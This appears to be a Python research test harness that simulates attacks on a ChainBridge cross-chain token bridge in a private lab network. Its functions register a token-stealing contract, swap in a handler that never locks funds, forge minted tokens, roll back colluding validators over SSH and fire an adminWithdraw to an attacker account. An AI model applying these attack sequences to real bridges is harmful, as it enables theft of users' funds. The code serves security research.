import logging
from multiprocessing.connection import wait
from typing import List
import eth_utils
import json
from utils.ufw_mod import UFW, REJECT, ALLOW
from utils.conntrack_mod import ConnTrack
from model.node import Node
from model.contract import ContractTypes
from urllib.parse import urlparse
from utils.cb_wrapper import CBWrapper
from utils.sys_mod import ssh_helper
from utils.resource_manager import *
from utils.cc_redeem import redeem_tokens, token_of_owner_by_index
import random
import os

# Endpoints
N0_C0_URL = "http://192.168.1.110:8545"
N0_C1_URL = "http://192.168.1.120:8545"
N0_C2_URL = "http://192.168.1.130:8545"
CHAIN0 = ['192.168.1.110', '192.168.1.111', '192.168.1.112', '192.168.1.113']
CHAIN1 = ['192.168.1.120', '192.168.1.121', '192.168.1.122', '192.168.1.123']
CHAIN2 = ['192.168.1.130', '192.168.1.131', '192.168.1.132', '192.168.1.133']
WAIT = 30
PKEY_PATH = 'resources/.secret'
TRUDY_PKEY_PATH = 'resources/.tsecret'
# The following contracts are malicious versions of chainbridge contracts
CROSS_COIN_STEALER = "0x217B8B9Dfd8a57ea923092A9E4Ed5682718339ea"
FAKE_LOCK_HANDLER = "0xb355b0b2c88d0333B77d2D641663AF7888DC26BD"


def block_connections(endpoints: List[str]):
    for ip in endpoints:
        ufw.alter_config(REJECT, ip)
        ct.drop(ip)


def unblock_connections(endpoints: List[str]):
    for ip in endpoints:
        ufw.alter_config(ALLOW, ip)


def _deploy_bridge(endpoint: Node, contracts: List[ContractTypes]):
    # Deploy new bridge on chain and save it on db
    out = cb.deploy(endpoint.node_endpoint, acc.key.hex(),
                    10000000, contracts, [acc.address], 1, endpoint.chain_id)
    save_contracts(out.stdout, endpoint.chain_id)


def _register_resource(endpoint: Node, resource_id: str, type: ContractTypes):
    # Registers resource on chain and save on local db
    dest_chain_config = True
    if not resource_id:
        resource_id = '0x'+os.getrandom(32).hex()
        dest_chain_config = False
    contracts = available_contracts(endpoint.chain_id, type)
    logging.info(contracts)
    cb.register_resource(endpoint.node_endpoint, acc.key.hex(
    ), 10000000, contracts['bridge'].address, contracts['handler'].address, resource_id, contracts['target'].address)
    save_binding(resource_id, contracts['bridge'].id,
                 contracts['handler'].id, contracts['target'].id, endpoint.chain_id)
    if dest_chain_config:
        # If this is a first deploy we are on a destination chain so we need to
        # set up the new token as burnable and add the minter
        cb.burnable(endpoint.node_endpoint, acc.key.hex(), 10000000,
                    contracts['bridge'].address, contracts['handler'].address, contracts['target'].address)
        cb.add_minter(endpoint.node_endpoint, acc.key.hex(),
                      10000000, type, contracts['handler'].address, contracts['target'].address)
    return resource_id


def deploy_bridge(type: ContractTypes):
    contracts_source = None
    contracts_dest = None
    if type == ContractTypes.ERC20:
        contracts_source = [ContractTypes.BRIDGE, ContractTypes.ERC20_HANDLER]
        contracts_dest = [ContractTypes.BRIDGE,
                          ContractTypes.ERC20_HANDLER, ContractTypes.ERC20]
    elif type == ContractTypes.ERC721:
        contracts_source = [ContractTypes.BRIDGE, ContractTypes.ERC721_HANDLER]
        contracts_dest = [ContractTypes.BRIDGE,
                          ContractTypes.ERC721_HANDLER, ContractTypes.ERC721]
    _deploy_bridge(n0, contracts_source)
    _deploy_bridge(n1, contracts_dest)
    # The vulnerability in the whole process is the fact that the user is the ralayer
    res_id_origin = _register_resource(n0, None, type)
    _register_resource(n1, res_id_origin, type)
    cb.update_config_json(n0.chain_id, type)
    cb.update_config_json(n1.chain_id, type)


def simple_token_transfer(amount: int, type: ContractTypes, recipient, source: Node, dest: Node, mint: bool = False):
    logging.info("Transferring amount %i of tokens from chain %i to chain %i" % (
        amount, source.chain_id, dest.chain_id))
    # Redeem tokens for this test
    if mint:
        redeem_tokens(source.provider, recipient,
                      source.provider.toWei(amount, 'ether'), type)
    # Gets the contract addresses for this type of transfer and the associated resource id
    contracts = available_contracts(source.chain_id, type)
    res_id = available_resources(source.chain_id, contracts['target'].id)
    if type == ContractTypes.ERC721:
        # For each nft fires an approve and transfer
        for i in range(amount):
            id = token_of_owner_by_index(source.provider, recipient.address, 0)
            cb.approve(source.node_endpoint, acc.key.hex(), 100000, type, id,
                       contracts['target'].address, contracts['handler'].address)
            cb.deposit(source.node_endpoint, acc.key.hex(), 100000, type, id,
                       dest.chain_id, contracts['bridge'].address, recipient.address, res_id)
    elif type == ContractTypes.ERC20:
        # For erc20 we need just one request
        cb.approve(source.node_endpoint, acc.key.hex(), 100000, type, amount,
                   contracts['target'].address, contracts['handler'].address)
        cb.deposit(source.node_endpoint, acc.key.hex(), 100000, type, amount,
                   dest.chain_id, contracts['bridge'].address, recipient.address, res_id)


def transfer_conn_lock(mint: bool = False):
    logging.info("Erc20 transfer with connection lock.")
    # Dest chain is unreachable (e.g. a muntain hut)
    block_connections([CHAIN1[0]])
    # Basic erc20 transfer is fired. We block our funds in our city
    simple_token_transfer(1, ContractTypes.ERC20, acc, n0, n1, mint)
    # We go away from our city and we reach the hut
    # (i.e. source chain is unreachable, dest chain is reachable)
    block_connections(CHAIN0[1:])
    unblock_connections([CHAIN1[0]])
    cb.start_relay()
    time.sleep(WAIT)
    # Test finished, we unblock all the connections so other test doesn't have issues
    cb.stop_relay()
    unblock_connections(CHAIN0[1:])


def transfer_conn_lock_back(mint: bool = False):
    logging.info("Erc20 transfer funds backwards.")
    simple_token_transfer(1, ContractTypes.ERC20, acc, n1, n0, mint)
    # Source chain is not reachable anymore
    block_connections([CHAIN1[0]])
    # Relay is started (since we haven't blocked the dest we don't need to unlock it).
    # For the next simulations dest will not be blocked and unlocked every time.
    # If we start the relay when we "arrive" ad destination the effect is the same.
    cb.start_relay()
    # TODO: Clearly the relay can't catch the deposit event, because source chain
    # is unreachable. We need to spin un a local node with source chain history
    # before going away.
    time.sleep(WAIT)
    cb.stop_relay()
    unblock_connections([CHAIN1[0]])


def transfer_crosscoin_stealer(mint: bool = False):
    logging.info("Erc20 transfer. Bad erc20 contract on dest chain.")
    # The owner of the bridge registers a contract wich steals user's tokens.
    contracts = available_contracts(n1.chain_id, ContractTypes.ERC20)
    res_id = available_resources(n1.chain_id, contracts['target'].id)
    cb.register_resource(n1.node_endpoint, acc.key.hex(), 100000,
                         contracts['bridge'].address, contracts['handler'].address, res_id, CROSS_COIN_STEALER)
    cb.burnable(n1.node_endpoint, acc.key.hex(), 100000,
                contracts['bridge'].address, contracts['handler'].address, CROSS_COIN_STEALER)
    cb.add_minter(n1.node_endpoint, acc.key.hex(),
                  10000000, ContractTypes.ERC20, contracts['handler'].address, CROSS_COIN_STEALER)
    # Transfer token on poisoned bridge
    simple_token_transfer(1, ContractTypes.ERC20, acc, n0, n1, mint)
    block_connections(CHAIN0[1:])
    cb.start_relay()
    time.sleep(WAIT)
    # Trudy address should increase, user shouldn't have tokens
    cb.balance(n1.node_endpoint, ContractTypes.ERC20,
               trudy.address, CROSS_COIN_STEALER)
    cb.balance(n1.node_endpoint, ContractTypes.ERC20,
               acc.address, CROSS_COIN_STEALER)
    # Test finished, unblock and restore old bridge
    cb.register_resource(n1.node_endpoint, acc.key.hex(), 100000,
                         contracts['bridge'].address, contracts['handler'].address, res_id, contracts['target'].address)
    cb.stop_relay()
    unblock_connections(CHAIN0[1:])


def fakelock_attack():
    logging.info(
        "Fakelock attack. The handler does not lock users funds on source chain.")
    # Pointing to the fakelock bridge.
    contracts = available_contracts(n0.chain_id, ContractTypes.ERC20)
    target_contract = available_contracts(
        n1.chain_id, ContractTypes.ERC20)['target'].address
    res_id = available_resources(n0.chain_id, contracts['target'].id)
    cb.register_resource(n0.node_endpoint, acc.key.hex(), 100000,
                         contracts['bridge'].address, FAKE_LOCK_HANDLER, res_id, contracts['target'].address)
    redeem_tokens(n0.provider, acc,
                  n0.provider.toWei(1, 'ether'), ContractTypes.ERC20)
    # Balance before the transfer with fakelock bridge
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               acc.address, contracts['target'].address)
    # User sends spend tokens
    simple_token_transfer(1, ContractTypes.ERC20, acc, n0, n1, False)
    block_connections(CHAIN0[1:])
    cb.start_relay()
    time.sleep(WAIT)
    # Balance on dest
    cb.balance(n1.node_endpoint, ContractTypes.ERC20,
               acc.address, target_contract)
    # Balance on source is the same as before
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               acc.address, contracts['target'].address)
    # Test finished, unblock and restore old bridge
    cb.stop_relay()
    unblock_connections(CHAIN0[1:])
    cb.register_resource(n0.node_endpoint, acc.key.hex(), 100000,
                         contracts['bridge'].address, contracts['handler'].address, res_id, contracts['target'].address)


def erc20_overflow(mint: bool = False):
    logging.info("Starting erc20 overflow attack.")
    contracts = available_contracts(
        n0.chain_id, ContractTypes.ERC20)
    # Forging tokens on source (not the main chain)
    cb.add_minter(n1.node_endpoint, acc.key.hex(),
                  10000000, ContractTypes.ERC20, trudy.address,
                  available_contracts(n1.chain_id, ContractTypes.ERC20)['target'].address)
    redeem_tokens(n1.provider, trudy, n1.provider.toWei(
        40, "Ether"), ContractTypes.ERC20)
    # Trudy and bridge before the overflow attack on source chain
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               trudy.address, contracts['target'].address)
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               contracts['handler'].address, contracts['target'].address)
    simple_token_transfer(40, ContractTypes.ERC20, trudy, n1, n0, False)
    # Moving forged tokens on source chain
    cb.start_relay()
    time.sleep(WAIT)
    # Trudy and bridge balance after the attack
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               trudy.address, contracts['target'].address)
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               contracts['handler'].address, contracts['target'].address)
    cb.stop_relay()


def malicious_rollback():
    logging.info("Started malicious rollback test.")
    redeem_tokens(n0.provider, acc,
                  n0.provider.toWei(1, 'ether'), ContractTypes.ERC20)
    # Origin chain collusion -> make backup of the previous state
    for node in CHAIN0:
        ssh_helper(node, 'root', ['cd', 'edge_utils', '&&', 'python3', 'helper.py',
                   'halt_node', '&&', 'python3', 'helper.py', 'backup', '--backup_name',
                                  'malicious_rollback', '--override', 'true', '&&', 'python3', 'helper.py', 'start_validator',
                                  '--ip', node, '1>/dev/null', '2>/dev/null'])
    contracts = available_contracts(n0.chain_id, ContractTypes.ERC20)
    target_contract = available_contracts(
        n1.chain_id, ContractTypes.ERC20)['target'].address
    # User's balance before the transfer
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               acc.address, contracts['target'].address)
    # User sends transfers the tokens
    simple_token_transfer(1, ContractTypes.ERC20, acc, n0, n1, False)
    # Balance after the transfer
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               acc.address, contracts['target'].address)
    block_connections(CHAIN0[1:])
    cb.start_relay()
    time.sleep(WAIT)
    # Balance on dest
    cb.balance(n1.node_endpoint, ContractTypes.ERC20,
               acc.address, target_contract)
    # Test finished, unblock and restore old bridge
    cb.stop_relay()
    unblock_connections(CHAIN0[1:])
    # Restore the old state
    for node in CHAIN0:
        ssh_helper(node, 'root', ['cd', 'edge_utils', '&&', 'python3', 'helper.py', 'halt_node', '&&',
                   'python3', 'helper.py', 'restore', '--backup_path', './edge/malicious_rollback',
                                  '&&', 'python3', 'helper.py', 'start_validator', '--ip', node, '1>/dev/null', '2>/dev/null'])
    # Balance on source is the same as before
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               acc.address, contracts['target'].address)


def concussion_attack():
    # This attack is a concussion attack if a user convinces the admin bridge
    # to withdraw funds from the bridge for him. If the admin steals the funds
    # for himself, then is a stealing of user funds
    # https://github.com/ChainSafe/chainbridge-solidity/blob/master/contracts/Bridge.sol#L333
    logging.info("Concussion attack test")
    # We generate a transfer so we have at least one token in ERC20Safe
    amount = n0.provider.toWei(1, 'ether')
    redeem_tokens(n0.provider, acc,
                  amount, ContractTypes.ERC20)
    simple_token_transfer(1, ContractTypes.ERC20, acc, n0, n1, False)
    contracts = available_contracts(n0.chain_id, ContractTypes.ERC20)
    # Trudy address before the steal
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               trudy.address, contracts['target'].address)
    # Tokens bridged whose ownership is of the handler
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               contracts['handler'].address, contracts['target'].address)
    # Load handler's abi, fire adminWithdraw
    with open('crosscoin/build/contracts/Bridge.json') as f:
        abi = json.loads(f.read())['abi']
    contract = n0.provider.eth.contract(
        address=contracts['bridge'].address, abi=abi)
    ''' The new bridge implementation changed format for function params
    target = n0.provider.toBytes(
        hexstr=contracts['target'].address).rjust(32, b'\0')
    trudy = n0.provider.toBytes(hexstr=trudy.address).rjust(32, b'\0')
    amount = n0.provider.toBytes(primitive=amount).rjust(32, b'\0')
    data = target + trudy + amount
    tx = contract.functions.adminWithdraw(
        contracts['handler'].address, data).buildTransaction(t_dict)'''
    # Fire transaction
    t_dict = {"chainId": n0.chain_id,
              "nonce": n0.provider.eth.get_transaction_count(acc.address, 'pending'),
              "gasPrice": n0.provider.toWei(10, "gwei"),
              "gas": 1000000}
    tx = contract.functions.adminWithdraw(
        contracts['handler'].address, contracts['target'].address, trudy.addr,
        amount).buildTransaction(t_dict)
    signed_tx = n0.provider.eth.account.sign_transaction(tx, acc.key)
    tx_hash = n0.provider.eth.send_raw_transaction(
        signed_tx.rawTransaction)
    logging.info("adminWithdraw tx_hash: " + tx_hash.hex())
    time.sleep(WAIT)
    # Trudy balance after the adminWithdraw
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               trudy.address, contracts['target'].address)
    # Tokens bridged balance after withdraw
    cb.balance(n0.node_endpoint, ContractTypes.ERC20,
               contracts['handler'].address, contracts['target'].address)


def tests():
    logging.info("Starting tests.")
    # deploy_bridge(ContractTypes.ERC20)
    # simple_token_transfer(1, ContractTypes.ERC20, n0, n1, True)  # Foward
    # simple_token_transfer(1, ContractTypes.ERC20, n1, n0) # Backward
    # transfer_conn_lock()
    # transfer_conn_lock_back()
    # transfer_crosscoin_stealer()
    # fakelock_attack()
    erc20_overflow()
    '''TODO: Una volta spostati fondi senza averli bloccati, lo spostamento
    all'indietro non dovrebbe funzionare in quanto non sono mai stati bloccati.
    Questo pero` non e` garantito perche` potrei andare a sbloccare fondi di
    altri utenti, intascandomeli.'''
    # malicious_rollback()
    # concussion_attack()

    logging.info("Finished tests.")


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    # Configuring nodes
    n0 = Node(N0_C0_URL)
    n1 = Node(N0_C1_URL)
    #n2 = Node(N0_C2_URL)
    # Configuring test accounts
    with open(PKEY_PATH) as f:
        key = f.readline().strip()
    acc = n0.provider.eth.account.from_key(key)
    logging.info("Imported account:" + acc.address)
    with open(TRUDY_PKEY_PATH) as f:
        key = f.readline().strip()
    trudy = n0.provider.eth.account.from_key(key)
    logging.info("Imported account:" + trudy.address)
    # Configuring wrappers for commands execution
    cb = CBWrapper()
    ufw = UFW()
    ct = ConnTrack()
    ufw.ufw_enable()
    if cb.is_chainbridge_running():
        cb.stop_relay()
    tests()
    # Restoring firewall options
    ufw.ufw_restore_rules()
    ufw.ufw_disable()
    cb.start_relay()
